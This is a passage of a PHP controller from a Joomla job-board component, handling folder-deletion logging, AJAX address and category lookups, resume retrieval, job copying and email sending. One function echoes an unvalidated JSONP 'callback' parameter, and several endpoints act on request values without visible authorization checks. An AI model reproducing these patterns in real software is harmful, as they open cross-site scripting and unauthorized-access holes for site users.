					$logarray['referenceid']=$return_value['referenceid'];
					$logarray['eventtype']=$return_value['eventtype'];
					$logarray['message']=$return_value['message'];
					$logarray['event']="Delete Folder";
					$logarray['messagetype']="Sucessfully";
					$logarray['datetime']=date('Y-m-d H:i:s');
					$jobsharing->write_JobSharingLog($logarray);
				}elseif($return_value['isfolderdelete']==-1){
					$logarray['uid']=$employer_model->_uid;
					$logarray['referenceid']=$return_value['referenceid'];
					$logarray['eventtype']=$return_value['eventtype'];
					$logarray['message']=$return_value['message'];
					$logarray['event']="Delete Folder";
					$logarray['messagetype']="Error";
					$logarray['datetime']=date('Y-m-d H:i:s');
					$serverid=0;
					$jobsharing->write_JobSharingLog($logarray);
				}
				$msg = JText :: _('JS_FOLDER_DELETED');
		}else{
				if ($return_value == 1)	{
					$msg = JText :: _('JS_FOLDER_DELETED');
				}elseif ($return_value == 2){
					$msg = JText :: _('JS_FOLDER_CANNOT_DELETE');
				}elseif ($return_value == 3){
					$msg = JText :: _('JS_NOT_YOUR_FOLDER');
				}else{
					$msg = JText :: _('JS_ERROR_DELETING_FOLDER');
				}
		}		
		$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=myfolders&Itemid='.$Itemid;
		//$this->setRedirect($link, $msg);
		$this->setRedirect(JRoute::_($link), $msg);
	}

	function listaddressdata()
	  { 
		 global $mainframe;
		$mainframe = &JFactory::getApplication();
		$common_model = $this->getModel('Common', 'JSJobsModel');

	     $data=JRequest::getVar( 'data');
	     $val=JRequest::getVar( 'val');

		$returnvalue = $common_model->listAddressData($data, $val);
		
		echo $returnvalue;
		$mainframe->close();
	  }
   function getaddressdatabycityname(){
        $maineframe = JFactory::getApplication();
		$common_model = $this->getModel('Common', 'JSJobsModel');
        $cityname = JRequest::getVar('q');
        $result = $common_model->getAddressDataByCityName($cityname);
        # JSON-encode the response
        $json_response = json_encode($result);

        # Optionally: Wrap the response in a callback function for JSONP cross-domain support
        if(isset($_GET["callback"])) {
            $json_response = $_GET["callback"] . "(" . $json_response . ")";
        }
        echo $json_response;
        $maineframe->close();
   }

	function listsearchaddressdata()
	  { 
		 global $mainframe;
		$mainframe = &JFactory::getApplication();
		$common_model = $this->getModel('Common', 'JSJobsModel');

	     $data=JRequest::getVar( 'data');
	     $val=JRequest::getVar( 'val');
		$returnvalue = $common_model->listSearchAddressData($data, $val);
		
		echo $returnvalue;
		$mainframe->close();
	  }

	function listfilteraddressdata()
	  { 
		 global $mainframe;
		$mainframe = &JFactory::getApplication();

	     $data=JRequest::getVar( 'data');
	     $val=JRequest::getVar( 'val');
		$jobseeker_model = $this->getModel('Jobseeker', 'JSJobsModel');
		
		$returnvalue = $jobseeker_model->listFilterAddressData($data, $val);
		
		echo $returnvalue;
		$mainframe->close();
	  }

	function listmodsearchaddressdata()
	  { 
		 global $mainframe;
		$mainframe = &JFactory::getApplication();
	     $data=JRequest::getVar( 'data');
	     $val=JRequest::getVar( 'val');
	     $for=JRequest::getVar( 'for');
		$common_model = $this->getModel('Common', 'JSJobsModel');
		$returnvalue = $common_model->listModuleSearchAddressData($data, $val, $for);
		
		echo $returnvalue;
		$mainframe->close();
	  }

	function listempaddressdata()
	  { 
		 global $mainframe;
		$mainframe = &JFactory::getApplication();
		 
	     $name=JRequest::getVar( 'name');
	     $myname=JRequest::getVar( 'myname');
	     $nextname=JRequest::getVar( 'nextname');

	     $data=JRequest::getVar( 'data');
	     $val=JRequest::getVar( 'val');
		 $employer_model = $this->getModel('Employer', 'JSJobsModel');

		$returnvalue = $employer_model->listEmpAddressData($name, $myname, $nextname, $data, $val);
		
		echo $returnvalue;
		$mainframe->close();
	  }
	
	function listdepartments()
	{ 
		global $mainframe;
		$mainframe = &JFactory::getApplication();
		$common_model = $this->getModel('Common', 'JSJobsModel');
		$val=JRequest::getVar( 'val');
		$returnvalue = $common_model->listDepartments($val);
		echo $returnvalue;
		$mainframe->close();
	}
	function listsubcategories()
	{
		global $mainframe;
		$mainframe = &JFactory::getApplication();

		$val=JRequest::getVar( 'val');

		$common_model = $this->getModel('Common', 'JSJobsModel');
		$returnvalue = $common_model->listSubCategories($val);

		echo $returnvalue;
		$mainframe->close();
	}
	function listfiltersubcategories()
	{
		global $mainframe;
		$mainframe = &JFactory::getApplication();

		$val=JRequest::getVar( 'val');
		$jobseeker_model = $this->getModel('Jobseeker', 'JSJobsModel');
		$returnvalue = $jobseeker_model->listFilterSubCategories($val);

		echo $returnvalue;
		$mainframe->close();
	}
	function listsubcategoriesforsearch()
	{
		global $mainframe;
		$mainframe = &JFactory::getApplication();

		$val=JRequest::getVar( 'val');
		$modulecall=JRequest::getVar( 'md');

		$common_model = $this->getModel('Common', 'JSJobsModel');
		$returnvalue = $common_model->listSubCategoriesForSearch($val);
                if($modulecall){
                    if($modulecall == 1){
                        $return = JText::_('JS_SUB_CATEGORY')."<br>".$returnvalue;
                        $returnvalue = $return;
                    }
                }

		echo $returnvalue;
		$mainframe->close();
	}
	
        function getresumedetail()
        {
            global $mainframe;
            $mainframe = &JFactory::getApplication();

            $user =& JFactory::getUser();
            $uid=$user->id;
            $jobid=JRequest::getVar( 'jobid');
            $resumeid=JRequest::getVar( 'resumeid');

			$jobseeker_model = $this->getModel('Jobseeker', 'JSJobsModel');
            $returnvalue = $jobseeker_model->getResumeDetail($uid, $jobid, $resumeid);

            echo $returnvalue;
            $mainframe->close();
        }
        function getmyforlders()  {
            global $mainframe;
			$mainframe = &JFactory::getApplication();

            $user=& JFactory::getUser();
            $uid=$user->id;
            $jobid=JRequest::getVar( 'jobid');
            $resumeid=JRequest::getVar( 'resumeid');
            $applyid=JRequest::getVar( 'applyid');

			$employer_model = $this->getModel('Employer', 'JSJobsModel');
            $returnvalue = $employer_model->getMyFoldersAJAX($uid, $jobid, $resumeid,$applyid);

            echo $returnvalue;
            $mainframe->close();
        }
        function mailtocandidate()  {
            global $mainframe;
			$mainframe = &JFactory::getApplication();

            $user=& JFactory::getUser();
            $uid=$user->id;
            $resumeid=JRequest::getVar( 'resumeid');
            $jobapplyid=JRequest::getVar( 'jobapplyid');
			$common_model = $this->getModel('Common', 'JSJobsModel');
            $returnvalue = $common_model->getMailForm($uid,$resumeid,$jobapplyid);
            echo $returnvalue;
            $mainframe->close();
        }
		function updateactionstatus(){
			global $mainframe;
			$mainframe = &JFactory::getApplication();
			$jobid=JRequest::getVar( 'jobid');
			$resumeid=JRequest::getVar( 'resumeid');
			$applyid=JRequest::getVar( 'applyid');
			$action_status=JRequest::getVar( 'action_status');
			$jobseeker_model = $this->getModel('Jobseeker', 'JSJobsModel');
			$employer_model = $this->getModel('Employer', 'JSJobsModel');
			$return_value = $jobseeker_model->updateJobApplyActionStatus($jobid,$resumeid,$applyid,$action_status);
			echo $return_value;
			$mainframe->close();
		}
        
	function getaddressdata()
	{
		global $mainframe;
		$mainframe = &JFactory::getApplication();
		$val=JRequest::getVar( 'val');

		$common_model = $this->getModel('Common', 'JSJobsModel');
		$returnvalue = $common_model->getAddressData($val);

		echo json_encode($returnvalue);
		$mainframe->close();
	}

	function getcopyjob()
	{
		global $mainframe;
		$mainframe = &JFactory::getApplication();
		$val=JRequest::getVar( 'val');

		$employer_model = $this->getModel('Employer', 'JSJobsModel');
		$jobsharing = $this->getModel('job_sharing', 'JSJobsModel');
		$return_data = $employer_model->getCopyJob($val);
		if(is_array($return_data)){
				if($return_data['isjobstore']==1){
					if($return_data['status']=="Job Edit"){
						$serverjobstatus="ok";
					}elseif($return_data['status']=="Job Add"){
						$serverjobstatus="ok";
					}elseif($return_data['status']=="Edit Job Userfield"){
						$serverjobstatus="ok";
					}elseif($return_data['status']=="Add Job Userfield"){
						$serverjobstatus="ok";
					}
					$logarray['uid']=$employer_model->_uid;
					$logarray['referenceid']=$return_data['referenceid'];
					$logarray['eventtype']=$return_data['eventtype'];
					$logarray['message']=$return_data['message'];
					$logarray['event']="job Copy";
					$logarray['messagetype']="Sucessfully";
					$logarray['datetime']=date('Y-m-d H:i:s');
					if(isset($return_data['jobcities'])){
						$jobsharing->update_MultiCityServerid($return_data['jobcities'],'jobcities');
					}
					
					$jobsharing->write_JobSharingLog($logarray);
					$jobsharing->Update_ServerStatus($serverjobstatus,$logarray['referenceid'],$return_data['serverid'],$logarray['uid'],'jobs');
				}elseif($return_data['isjobstore']==0){
					if($return_data['status']=="Data Empty"){
						$serverjobstatus="Data not post on server";
					}elseif($return_data['status']=="job Saving Error"){
						$serverjobstatus="Error Job Saving";
					}elseif($return_data['status']=="Auth Fail"){
						$serverjobstatus="Authentication Fail";
					}elseif($return_data['status']=="Error Save Job Userfield"){
						$serverjobstatus="Error Save Job Userfield";
					}elseif($return_data['status']=="Improper job name"){
						$serverjobstatus="Improper job name";
					}
					$logarray['uid']=$employer_model->_uid;
					$logarray['referenceid']=$return_data['referenceid'];
					$logarray['eventtype']=$return_data['eventtype'];
					$logarray['message']=$return_data['message'];
					$logarray['event']="job Copy";
					$logarray['messagetype']="Error";
					$logarray['datetime']=date('Y-m-d H:i:s');
					$serverid=0;
					$jobsharing->write_JobSharingLog($logarray);
					$jobsharing->Update_ServerStatus($serverjobstatus,$logarray['referenceid'],$serverid,$logarray['uid'],'jobs');
				}
				echo true;
				$mainframe->close();
		}else{
			echo $return_data;
			$mainframe->close();
		}
	}
	function sendtofriend()
	{
		global $mainframe;
		$mainframe = &JFactory::getApplication();
		$val = json_decode(JRequest::getVar('val'),true);
		$jobseeker_model = $this->getModel('Jobseeker', 'JSJobsModel');
		$returnvalue = $jobseeker_model->sendToFriend($val);
		echo $returnvalue;
		$mainframe->close();
	}
	function sendtocandidate()
	{
		global $mainframe;
		$mainframe = &JFactory::getApplication();
		$val = json_decode(JRequest::getVar('val'),true);

		$jobseeker_model = $this->getModel('Jobseeker', 'JSJobsModel');
		$returnvalue = $jobseeker_model->sendToCandidate($val);
		
		echo $returnvalue;
		$mainframe->close();
	}
	function sendjobalert(){
		global $mainframe;
		$mainframe = &JFactory::getApplication();
		$ck = JRequest::getVar('ck');
		$jobseeker_model = $this->getModel('Jobseeker', 'JSJobsModel');
		$result = $jobseeker_model->sendJobAlertByAlertType($ck);
		echo $result;
		$mainframe->close();
	}

	function checkuserdetail()
	{
		global $mainframe;
		$mainframe = &JFactory::getApplication();
		$val=JRequest::getVar( 'val');
		$for=JRequest::getVar( 'fr');
		
		$common_model = $this->getModel('Common', 'JSJobsModel');
		$returnvalue = $common_model->checkUserDetail($val,$for);

		echo $returnvalue;
		$mainframe->close();
	}

	function display()
	{
		$document = & JFactory :: getDocument();
		$viewName = JRequest :: getVar('view', 'resume');
		$layoutName = JRequest :: getVar('layout', 'jobcat');
		$viewType = $document->getType();
		$common_model = $this->getModel('Common', 'JSJobsModel');
		$jobseeker_model = $this->getModel('Jobseeker', 'JSJobsModel');
		$employer_model = $this->getModel('Employer', 'JSJobsModel');
		
		$view = & $this->getView($viewName, $viewType);
		if (!JError :: isError($employer_model) && !JError :: isError($jobseeker_model) && !JError :: isError($common_model))
		{
			$view->setModel($employer_model, true);
			$view->setModel($jobseeker_model);
			$view->setModel($common_model);
		}
		$view->setLayout($layoutName);
		$view->display();
	}
}
?>
